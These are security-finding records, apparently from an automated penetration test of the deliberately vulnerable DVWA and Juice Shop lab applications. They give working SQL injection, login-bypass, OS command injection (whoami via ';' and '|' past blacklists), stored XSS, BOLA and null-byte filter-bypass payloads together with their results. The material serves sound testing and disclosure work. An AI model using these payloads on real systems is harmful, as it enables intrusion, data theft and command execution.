findings.title: SQL Injection via unsanitized 'id' parameter in DVWA SQLi page [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned FIVE seeded user records (bypassing the intended single-row lookup): 'admin/admin', 'Gordon/Brown', 'Hack/Me', 'Pablo/Picasso', 'Bob/Smith'. FALSE payload id=1' AND '1'='2 returned zero records (visible_text shows only 'User ID:' label with no 'First name:'/'Surname:' rows). This differential boolean behavior confirms the id parameter is concatenated unsanitized into the SQL query, exhibiting classic boolean-based SQL injection.

findings.title: OS Command Injection via unsanitized 'ip' parameter in DVWA Ping tool [security=low]
findings.response_evidence: [security=low] Response pre_blocks contained the normal ping output for 127.0.0.1 (4 packets, 0% packet loss) immediately followed by the extra line 'www-data' — the output of the injected 'whoami' command appended via the shell metacharacter ';'. This confirms the 'ip' field is passed unsanitized to a shell command, allowing arbitrary OS command execution as the web-server process user www-data.

findings.title: Stored Cross-Site Scripting via unsanitized guestbook 'mtxMessage' field [security=low]
findings.response_evidence: [security=low] After submitting the canary payload, the guestbook page (loaded fresh via browser_navigate in the authenticated dvwa_admin session) executed the injected script. browser_eval_js('window.xss_flag') returned 1, and browser_read_dom('#test_token') confirmed the injected <script id="test_token"> element is present in the live DOM with inner_text 'window.xss_flag=1'. This proves the stored message field is rendered without sanitization/encoding, resulting in persistent stored XSS that executes in the victim's browser context.
findings.browser_js_evidence: window.xss_flag === 1 (confirmed via browser_eval_js); DOM element #test_token inner_html_excerpt: "window.xss_flag=1"

findings.title: OS Command Injection via pipe bypass at DVWA medium security (exec)
findings.response_evidence: [security=medium] Page confirms 'Security Level: medium'. Payload ip=127.0.0.1| whoami bypassed the medium-level blacklist (which only strips ';' and '&&', not '|'). Response visible_text included 'Enter an IP address: www-data' and pre_blocks returned exactly ['www-data'], confirming command execution as the web-server identity www-data.

findings.title: SQL Injection via numeric boolean payload at DVWA medium security (sqli POST)
findings.response_evidence: [security=medium] Page confirms 'Security Level: medium'; id field is a POST-based select (no quotes needed since medium escapes quotes, so numeric boolean injection used). TRUE payload 'id=1 OR 1=1' returned 5 seeded user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) — i.e. the entire users table dumped via the boolean-true injection. FALSE payload 'id=1 AND 1=2' returned zero records (pre_blocks empty, visible_text shows no 'ID:' rows), confirming the backend query is directly concatenating the numeric id parameter without sanitization.

findings.title: SQL Injection in Product Search (error-based + UNION-based)
findings.response_evidence: Request 1 (single quote q=qwert'): HTTP 500 with body 'Error: SQLITE_ERROR: near "\'%\'": syntax error' confirming raw string concatenation into SQL query (error-based SQLi proof). Request 2 (UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--): HTTP 200 with JSON body {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} — attacker-controlled UNION SELECT of literal integers returned as a product row with all 9 columns correctly aligned, proving successful UNION-based SQL injection against the underlying Sequelize/SQLite query.

findings.title: Authentication Bypass via SQL Injection in Login (email field)
findings.response_evidence: Response HTTP 200 with body {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The injected email payload ' OR 1=1-- bypassed the password check by always evaluating the WHERE clause to true, and the server returned a valid signed authentication token along with "umail":"admin@juice-sh.op" and "bid":1 — confirming the first user record (admin@juice-sh.op) was authenticated without knowledge of the correct password. bid:1 also corresponds to admin's basket id, consistent with returning the first row of the users table ordered by id.

findings.title: Broken Object Level Authorization (BOLA) on Basket Retrieval Endpoint
findings.response_evidence: As acct1 (own_basket_id=6), GET /rest/basket/6 returned HTTP 200 with basket UserId:22, Products: [{name:'Apple Juice (1000ml)', BasketItem:{BasketId:6, id:9, quantity:3}}] — this is acct1's own distinct seeded basket. Then, authenticated as juiceshop_acct2 (whose own_basket_id is 7, a different basket), requesting the SAME URL GET /rest/basket/6 also returned HTTP 200 with the IDENTICAL body: UserId:22, Products:[{name:'Apple Juice (1000ml)', BasketItem:{BasketId:6, id:9, quantity:3}}]. acct2 successfully retrieved acct1's basket contents (product 'Apple Juice (1000ml)', quantity 3) despite not owning basket id 6, with no authorization/ownership check enforced by the server — confirming cross-user BOLA.

findings.title: Poison Null-Byte Extension Filter Bypass Retrieves Restricted Backup File (/ftp/package.json.bak)
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak -> HTTP 403 'Error: Only .md and .pdf files are allowed!' (fileServer.js:55 verify middleware)
GET http://juiceshop:3000/ftp/package.json.bak%2500.md -> HTTP 200, body: full package.json content starting '{"name": "juice-shop", "version": "6.2.0-SNAPSHOT", ...}'
findings.response_evidence: Direct request to /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' thrown by the verify() middleware in fileServer.js:55, confirming the extension filter blocks the restricted .bak file. Appending a URL-encoded null byte plus an allowed extension (%2500.md) bypassed this filter: GET /ftp/package.json.bak%2500.md returned HTTP 200 with content-type application/octet-stream and the full contents of the restricted package.json backup file (visible fields: name 'juice-shop', version '6.2.0-SNAPSHOT', dependencies list, etc.), proving the poison null-byte path traversal/filter bypass.

GET /encryptionkeys/jwt.pub -> HTTP 200, body contains '-----BEGIN RSA PUBLIC KEY----- MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE= -----END RSA PUBLIC KEY-----'. findings.title: SQL Injection via out-of-band session-input id parameter (DVWA high security)
findings.response_evidence: [security=high] Confirmed page footer shows 'Security Level: high' throughout. TRUE payload `1' OR '1'='1' #` submitted via session-input.php, then GET /vulnerabilities/sqli/ returned 5 seeded records with distinct surnames: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (raw pre_blocks each echoing "ID: 1' OR '1'='1' #\nFirst name: ...\nSurname: ..."). FALSE control payload `1' AND '1'='2' #` submitted via session-input.php, then GET /vulnerabilities/sqli/ returned zero pre_blocks / no ID-First name-Surname records (visible_text only shows the 'Click here to change your ID' link and no result rows). This confirms the out-of-band session-stored id is interpolated unsanitized into a SQL query with an appended LIMIT 1 clause, requiring the trailing '#' comment to neutralize it, consistent with the high-security SQLi bypass technique.

findings.title: OS Command Injection via ip parameter using pipe without trailing space (DVWA high security)
findings.response_evidence: [security=high] Page footer confirms 'Security Level: high'. Payload `127.0.0.1|whoami` (pipe with NO trailing space, bypassing the high-security blacklist of '; ', '| ' (pipe+space), and '&&') was submitted to the ip field. Response pre_blocks contained the literal output "www-data", i.e. the web server process identity returned by the injected `whoami` command, proving unsanitized command execution on the host.
